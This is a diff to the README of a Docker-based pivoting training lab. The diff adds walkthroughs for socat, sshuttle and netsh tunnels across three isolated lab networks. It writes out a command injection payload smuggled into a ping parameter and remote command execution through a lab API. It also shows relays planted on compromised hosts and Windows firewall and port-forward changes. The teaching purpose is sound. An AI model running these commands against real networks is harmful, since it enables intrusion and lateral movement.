@@ -1,6 +1,6 @@
-# Pivoting Lab - SSH vs Chisel vs Ligolo-ng
+# Pivoting Lab — SSH, Chisel, Ligolo-ng, socat, sshuttle, netsh
 
-A Docker-based training lab for practicing network pivoting through three isolated network segments using three different tunneling methods.
+A Docker-based training lab for practicing network pivoting through three isolated network segments using six different tunneling methods.
 
 Originally forked from [Cimihan123/Docker-Pivot-Lab](https://github.com/Cimihan123/Docker-Pivot-Lab), redesigned to showcase modern pivoting tools alongside the traditional SSH approach.
 
@@ -16,11 +16,13 @@ Net A (10.10.1.0/24)       Net B (10.10.2.0/24)       Net C (10.10.3.0/24)
 │              │  │                  │  │                  │  │              │
 │ ligolo-proxy │  │ Flask :5000      │  │ Flask :8080      │  │ HTTP :80     │
 │ chisel       │  │ SSH :22          │  │ NO SSH           │  │ SecretVault  │
-│ nmap, hydra  │  │ cmd injection    │  │ /api/exec RCE    │  │ FLAG{...}    │
+│ socat        │  │ socat (pre-inst) │  │ socat (pre-inst) │  │ FLAG{...}    │
+│ sshuttle     │  │ cmd injection    │  │ /api/exec RCE    │  │              │
+│ nmap, hydra  │  │                  │  │                  │  │              │
 └──────────────┘  └──────────────────┘  └──────────────────┘  └──────────────┘
 ```
 
-**Key design choice:** Pivot2 has **no SSH server**. This is deliberate - it's where the three tunneling methods diverge in difficulty and where Chisel and Ligolo-ng really prove their value.
+**Key design choice:** Pivot2 has **no SSH server**. This is deliberate — it's where the tunneling methods diverge most sharply. Methods that require SSH (SSH+proxychains, sshuttle) need a workaround for the second pivot; methods that don't (Chisel, Ligolo-ng, socat) continue cleanly.
 
 ## Quick Start
 
@@ -50,7 +52,7 @@ docker compose down
 1. Gain a foothold on **pivot1** (Net A → Net B)
 2. Discover and exploit **pivot2** through the tunnel (Net B → Net C)
 3. Reach the **target** SecretVault on Net C and capture the flag
-4. Repeat using all three tunneling methods to understand the tradeoffs
+4. Repeat using all six tunneling methods to understand the tradeoffs
 
 ## Tips Before You Start
 
@@ -355,20 +357,176 @@ Notice what you didn't need: no proxychains, no SSH port forwards, no mixing too
 
 ---
 
+---
+
+## Method 4: socat (TCP Relay Chains)
+
+socat (SOcket CAT) creates bidirectional byte streams between any two endpoints. For pivoting, you chain TCP listeners that relay traffic hop by hop. Unlike SOCKS proxies or TUN tunnels, each service you want to reach needs its own relay process — surgical, but it requires no special binary beyond socat itself, which is available in every major Linux package manager.
+
+**socat is pre-installed on pivot1 and pivot2 in this lab.** In a real engagement you'd upload a static binary.
+
+### First Pivot — Relay pivot2's API through pivot1
+
+```bash
+# On pivot1 (via SSH or command injection):
+# Create a relay: connections to pivot1:9090 are forwarded to pivot2:8080
+ssh root@10.10.1.20 "socat TCP-LISTEN:9090,fork,reuseaddr TCP:10.10.2.30:8080 &"
+
+# Or via command injection (URL-encode the spaces and ampersand):
+curl "http://10.10.1.20:5000/ping?host=;socat%20TCP-LISTEN:9090,fork,reuseaddr%20TCP:10.10.2.30:8080%20%26"
+```
+
+Now hit pivot2's API directly from the attacker through the relay:
+
+```bash
+curl http://10.10.1.20:9090/api/health
+curl -X POST http://10.10.1.20:9090/api/exec -d 'cmd=id'
+curl -X POST http://10.10.1.20:9090/api/exec -d 'cmd=ip addr'
+```
+
+### Second Pivot — Relay the target through pivot2
+
+```bash
+# Deploy a relay on pivot2 via the API (socat is pre-installed)
+curl -X POST http://10.10.1.20:9090/api/exec \
+  -d 'cmd=socat TCP-LISTEN:9000,fork,reuseaddr TCP:10.10.3.40:80 &'
+
+# On pivot1: add a second relay that bridges attacker → pivot2's new relay
+ssh root@10.10.1.20 "socat TCP-LISTEN:9091,fork,reuseaddr TCP:10.10.2.30:9000 &"
+```
+
+Reach the target from the attacker:
+
+```bash
+curl http://10.10.1.20:9091/
+```
+
+You should see the SecretVault page with the flag.
+
+**The tradeoff:** You now have two `socat` processes on pivot1 and one on pivot2 just to expose a single port. Add another target port (e.g. HTTPS on 443) and you double that count. Compare this to ligolo-ng where `ip route add 10.10.3.0/24 dev ligolo2` makes every port on every host just work.
+
+---
+
+## Method 5: sshuttle (Transparent VPN over SSH)
+
+sshuttle builds a transparent VPN-like tunnel using SSH and Python — no SOCKS, no proxychains, no configuration. It rewrites your local routing table and iptables so that traffic destined for the target subnet automatically flows through SSH. Tools work natively: `nmap`, `curl`, browser, everything.
+
+**Requirements:** Python must be on the SSH pivot (pivot1 has it). Requires root/sudo on the attacker for iptables manipulation (the container already runs as root).
+
+### First Pivot — Route Net B transparently
+
+```bash
+# On attacker: route all 10.10.2.0/24 traffic through pivot1's SSH
+# Runs in the foreground — leave it running, open a second terminal for the next steps
+sshuttle -r root@10.10.1.20 10.10.2.0/24 --ssh-cmd 'ssh -o StrictHostKeyChecking=no'
+```
+
+In another terminal, Net B is now directly reachable — **no proxychains needed**:
+
+```bash
+# Full nmap scans work (no -sT workaround needed for most scans)
+nmap -sT -Pn -F 10.10.2.30
+
+# Tools just work
+curl http://10.10.2.30:8080/api/health
+curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=id'
+curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=ip addr'
+```
+
+### Second Pivot — The limitation, and the workaround
+
+pivot2 has no SSH, so you can't chain another sshuttle. This is sshuttle's key constraint: **every hop in the chain needs SSH access**.
+
+**Workaround — combine sshuttle + socat:**
+
+```bash
+# With sshuttle running (10.10.2.30 is directly reachable):
+# Use pivot2's API to deploy a socat relay pointing at the target
+curl -X POST http://10.10.2.30:8080/api/exec \
+  -d 'cmd=socat TCP-LISTEN:9000,fork,reuseaddr TCP:10.10.3.40:80 &'
+
+# Now access the target through pivot2's relay
+# sshuttle routes us to 10.10.2.30; socat on :9000 relays to target:80
+curl http://10.10.2.30:9000/
+```
+
+This hybrid (sshuttle for transparent routing + socat for the SSH-less hop) gets you to the flag with minimal configuration.
+
+> **Why sshuttle over SSH+proxychains?** Both use SSH, but sshuttle provides transparent routing while proxychains needs every tool to be proxy-aware. `ping`, raw sockets, and UDP all work through sshuttle without any configuration changes.
+
+---
+
+## Method 6: netsh (Windows Built-in — Reference)
+
+`netsh interface portproxy` is Windows' built-in TCP port-forwarding command. It's the Windows equivalent of `socat TCP-LISTEN:... TCP:...`: no binary upload required, but you need Administrator privileges and a Firewall rule to open the listen port.
+
+**This lab uses Linux containers, so netsh isn't executable here.** This section documents the commands you'd run when you encounter a Windows pivot host in a real engagement.
+
+### When to use it
+
+- You've compromised a Windows host that sits between networks
+- You can't (or don't want to) upload tool binaries — netsh is built-in
+- You need a simple point-to-point port relay, not a full SOCKS tunnel
+
+### Commands
+
+```cmd
+REM --- SETUP ---
+
+REM Relay: anyone hitting WindowsPivot:9090 is forwarded to pivot2:8080
+netsh interface portproxy add v4tov4 ^
+    listenport=9090 listenaddress=0.0.0.0 ^
+    connectport=8080 connectaddress=10.10.2.30
+
+REM Open Windows Firewall to allow inbound traffic on the listen port
+netsh advfirewall firewall add rule ^
+    name="PivotRelay9090" dir=in action=allow protocol=TCP localport=9090
+
+REM --- INSPECT ---
+
+REM View all active port proxy rules
+netsh interface portproxy show all
+
+REM --- TEARDOWN ---
+
+netsh interface portproxy delete v4tov4 listenport=9090 listenaddress=0.0.0.0
+netsh advfirewall firewall delete rule name="PivotRelay9090"
+```
+
+For a double pivot, chain two Windows hosts the same way you'd chain socat relays — one portproxy rule per hop per service.
+
+**Linux equivalent using iptables DNAT** (same concept, different syntax):
+
+```bash
+# Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Relay: connections to this host on port 9090 are forwarded to pivot2:8080
+iptables -t nat -A PREROUTING -p tcp --dport 9090 -j DNAT --to-destination 10.10.2.30:8080
+iptables -t nat -A POSTROUTING -j MASQUERADE
+```
+
+---
+
 ## Comparison
 
-| Feature | SSH + Proxychains | Chisel | Ligolo-ng |
-|---|---|---|---|
-| Requires SSH on target | ✅ Yes | ❌ No | ❌ No |
-| Requires proxychains | ✅ Yes | ✅ Yes | ❌ No |
-| ICMP/ping works through tunnel | ❌ No | ❌ No | ✅ Yes |
-| UDP works through tunnel | ❌ No | ✅ Partial | ✅ Yes |
-| Nmap SYN scan works | ❌ No | ❌ No | ⚠️ Translates to connect() |
-| Double pivot complexity | 🔴 High | 🟡 Medium (still needs SSH relay) | 🟢 Low |
-| Built-in port forwarding | SSH -L/-R | Remotes config | `listener_add` |
-| Transport protocol | SSH | HTTP/WebSocket | TCP/TLS |
-| Speed | Good | Good | Excellent (100+ Mbps) |
-| Double pivot without mixing tools | ❌ No | ❌ No (needed SSH -R) | ✅ Yes |
+| Feature | SSH + Proxychains | Chisel | Ligolo-ng | socat | sshuttle | netsh |
+|---|---|---|---|---|---|---|
+| Requires SSH on target | ✅ Yes | ❌ No | ❌ No | ❌ No | ✅ Yes (each hop) | ❌ No |
+| Requires proxychains | ✅ Yes | ✅ Yes | ❌ No | ❌ No | ❌ No | ❌ No |
+| ICMP/ping works | ❌ No | ❌ No | ✅ Yes | ❌ No | ✅ Yes | ❌ No |
+| UDP support | ❌ No | ✅ Partial | ✅ Yes | ✅ Yes | ✅ Yes | ⚠️ Partial |
+| Nmap SYN scan | ❌ No | ❌ No | ⚠️ connect() | ❌ No | ✅ Yes | ❌ No |
+| Binary upload to target | ❌ No | ✅ Yes | ✅ Yes | ✅ Yes\* | ❌ No | ❌ No (built-in) |
+| Double pivot complexity | 🔴 High | 🟡 Medium | 🟢 Low | 🔴 High | 🟡 Medium† | 🔴 High |
+| Routing style | SOCKS proxy | SOCKS proxy | Routed (TUN) | Port relay | Transparent | Port relay |
+| Transport | SSH | HTTP/WebSocket | TCP/TLS | TCP/UDP | SSH | TCP |
+| Speed | Good | Good | Excellent | Good | Good | Good |
+| Platform | Linux/Mac | Cross-platform | Cross-platform | Linux/Mac | Linux/Mac | ⚠️ Windows only |
+| Best for | Classic SSH access | HTTP firewall bypass | Large ops, clean UX | Quick single-port relay | Transparent routing w/ SSH | Windows pivots, no uploads |
+
+\* socat is pre-installed on pivot1/pivot2 in this lab. In real engagements, upload a static build.  
+† sshuttle requires SSH on each hop; use socat/netsh for SSH-less hops in the chain.
 
 ## Troubleshooting
 
